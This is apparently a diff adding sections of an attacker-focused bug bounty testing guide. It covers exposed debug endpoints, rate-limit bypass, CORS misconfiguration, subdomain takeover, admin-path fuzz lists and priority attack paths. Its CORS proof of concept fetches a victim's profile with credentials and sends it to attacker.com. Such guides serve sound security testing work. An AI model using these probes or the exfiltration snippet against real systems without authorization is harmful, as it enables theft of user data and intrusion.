+# Spring Boot Actuator
+GET /actuator
+GET /actuator/env           (all environment variables)
+GET /actuator/heapdump      (full JVM heap — contains secrets in memory)
+GET /actuator/mappings      (all registered routes)
+GET /actuator/logfile
+GET /actuator/beans
+
+# Django
+GET /__debug__/
+Any 500 error page with DEBUG=True (full stack trace + local variables)
+
+# Laravel
+GET /telescope
+GET /horizon
+
+# Node.js / Express
+GET /status
+GET /_debug
+GET /api/debug
+```
+
+**Tags:** `debug` `actuator` `misconfiguration` `information-disclosure`
+
+---
+
+### 8.3 Missing Rate Limiting on Sensitive Endpoints
+**Severity:** `HIGH`
+
+**Why it happens:**
+No throttling implemented on login, OTP verification, password reset, API key generation, or email verification. Enables brute force, OTP enumeration, or credential stuffing at scale.
+
+**How to test:**
+1. Send 100+ requests to `/login`, `/verify-otp`, `/forgot-password`, `/api/keys/generate`.
+2. Check response headers for rate limit indicators: `X-RateLimit-Remaining`, `Retry-After`.
+3. Bypass techniques: rotate `X-Forwarded-For` IPs, vary `User-Agent`, distribute across usernames.
+4. A 6-digit OTP = 1,000,000 max attempts. With no rate limit, brute force is trivial.
+5. Also test: registration endpoint (account creation spam), coupon validation, referral code submission.
+
+**Tags:** `rate-limiting` `brute-force` `OTP` `credential-stuffing`
+
+---
+
+### 8.4 CORS Misconfiguration
+**Severity:** `HIGH`
+
+**Why it happens:**
+`Access-Control-Allow-Origin: *` is set broadly, or the server reflects the `Origin` header value without allowlist validation. Combined with `Access-Control-Allow-Credentials: true`, this allows attacker-hosted pages to make credentialed cross-origin requests and read the response.
+
+**How to test:**
+1. Add `Origin: https://attacker.com` header to API requests. Inspect ACAO response header.
+2. Try null origin: `Origin: null` (sent by sandboxed iframes, `data:` URIs).
+3. Try subdomain: `Origin: https://attacker.target.com` — some regex match `*.target.com` insecurely.
+4. **Critical finding criteria:** ACAO reflects origin AND `Access-Control-Allow-Credentials: true`.
+5. Most impactful on `/api/me`, `/api/tokens`, `/api/profile` — any auth-required data endpoint.
+
+**PoC exploit:**
+```javascript
+fetch('https://target.com/api/me', {credentials: 'include'})
+  .then(r => r.text())
+  .then(d => fetch('https://attacker.com?data=' + btoa(d)));
+```
+
+**Tags:** `CORS` `credentials` `misconfiguration` `SOP-bypass`
+
+---
+
+### 8.5 Subdomain Takeover
+**Severity:** `HIGH`
+
+**Why it happens:**
+A DNS CNAME record points to a cloud service (GitHub Pages, Heroku, S3, Netlify, Azure) where the target no longer has a registered resource. An attacker can claim the dangling resource and serve content from the trusted subdomain.
+
+**How to test:**
+1. Enumerate subdomains (subfinder, amass, crt.sh).
+2. Check CNAME records for each: `dig CNAME sub.target.com`.
+3. For each CNAME target, test if the cloud service shows "not found" / unclaimed state:
+   - GitHub Pages: `There isn't a GitHub Pages site here`
+   - Heroku: `No such app`
+   - AWS S3: `NoSuchBucket`
+   - Azure: `404 Web Site not found`
+4. Claim the resource on the platform and serve a PoC HTML page.
+
+**Common vulnerable services:**
+```
+*.github.io          *.herokudns.com      *.s3.amazonaws.com
+*.azurewebsites.net  *.netlify.app        *.surge.sh
+*.fastly.net         *.readme.io          *.zendesk.com
+```
+
+**Tags:** `subdomain-takeover` `DNS` `cloud` `dangling-CNAME`
+
+---
+
+### 8.6 Admin Panel Exposure
+**Severity:** `HIGH`
+
+**Why it happens:**
+Admin interfaces deployed at predictable paths without IP allowlisting, additional authentication, or network-level access controls. Security through obscurity fails when path names are predictable.
+
+**How to test:**
+```
+# Common admin paths (fuzz with these first)
+/admin          /admin/login     /administrator
+/wp-admin       /wp-login.php    /phpmyadmin
+/adminer        /adminer.php     /db
+/cpanel         /plesk           /webmin
+/manage         /dashboard       /control
+/staff          /internal        /backoffice
+/_admin         /admin123        /secret
+/api/admin      /v1/admin        /superuser
+```
+
+**Tags:** `admin-panel` `exposure` `misconfiguration`
+
+---
+
+## 9. Top 5 Attack Paths — Prioritize First
+
+> These consistently yield critical / high findings in bug bounties and real assessments with the highest effort-to-impact ratio.
+
+---
+
+### #1 — Authentication Flows (JWT / OAuth / MFA)
+A single finding here is almost always a **Critical**. Start with:
+- JWT `alg:none` and algorithm confusion attacks
+- OAuth `state` param validation and `redirect_uri` manipulation
+- MFA step skip and response manipulation bypass
+
+**Time to test:** 1–2 hours
+**Expected severity:** Critical / High
+
+---
+
+### #2 — IDOR Across All Object Types
+Create two accounts. Enumerate every ID-bearing endpoint. Swap IDs. Many applications check authentication but not ownership at the data layer.
+
+- Test `GET`, `PUT`, `DELETE`, `PATCH` separately — often inconsistently protected
+- Don't skip export, PDF, notification, and sharing endpoints
+- Check batch/bulk endpoints with mixed-ownership ID arrays
+
+**Time to test:** 2–4 hours
+**Expected severity:** Critical / High
+
+---
+
+### #3 — Mass Assignment on Write Endpoints
+Inspect `GET` responses. Submit all visible fields (plus guessed ones) back via `POST` / `PUT`. Focus on registration, profile update, and any object creation endpoint.
+
+Target fields: `isAdmin`, `role`, `verified`, `emailVerified`, `balance`, `credits`, `plan`, `subscription`, `permissions`
+
+**Time to test:** 30–60 minutes
+**Expected severity:** Critical / High
+
+---
+
+### #4 — SSRF on URL-Accepting Parameters
+Any feature that fetches remote content is a potential SSRF vector: webhooks, integrations, link previews, import features, PDF generators, avatar URLs, health check endpoints.
+
+- Cloud environments (AWS, GCP, Azure): instant credential theft via metadata API
+- Internal services: often no auth on internal network (Kubernetes API, Consul, Redis)
+
+**Time to test:** 30–60 minutes
+**Expected severity:** Critical / High
+
+---
+
+### #5 — JS Bundle Analysis + Debug/Config Endpoint Probing
+Low effort, high yield. Spend 30–60 minutes on this before touching the main app logic:
+
+1. Download and grep all JS bundles for hidden routes and hardcoded secrets
+2. Fuzz for `.env`, `/actuator`, `/telescope`, `/__debug__/`, `/admin`
+3. Check every subdomain's CNAME for takeover opportunities
+
+**Time to invest:** 30–60 minutes
+**Expected severity:** Critical (secrets) / High (hidden routes)
+
+---
+
+## 10. What to Deprioritize — Low ROI
+
+> These issues exist but rarely yield meaningful bug bounty payouts or real-world impact on their own. Skip them unless you have a specific chaining scenario in mind.
+
+| Issue | Why to Skip |
+|---|---|
+| **Clickjacking** | Only pays if there's a meaningful state-changing action on the framed page. Rare. |
+| **Self-XSS** | Only affects your own account. Not accepted by most programs. |
+| **Missing security headers alone** | CSP, X-Frame-Options, HSTS — scanner noise without a chained exploit. |
+| **OPTIONS / TRACE methods enabled** | No demonstrated impact in modern apps. WAF/scanner finding. |
+| **SSL/TLS configuration** | TLS 1.0/1.1, weak ciphers — rarely accepted unless PCI-scope is stated. |
+| **Username enumeration alone** | Valid finding, but low severity. Only escalate if you can chain it. |
+| **Open redirect without OAuth** | Without a token theft scenario, most programs rate this as informational. |
+| **CSRF on low-impact actions** | CSRF on logout, theme change, language preference — not worth submitting alone. |
+| **Email/username enumeration via timing** | Hard to exploit reliably at scale. Low payout. |
+| **SPF/DMARC misconfiguration** | Valid security issue, but almost never in scope for web app bounties. |
+
+---
+
+*Last updated: 2026 — attacker-focused, framework-agnostic.*
+*Cross-reference: OWASP Testing Guide, PortSwigger Web Security Academy, HackerOne Hacktivity top findings.*
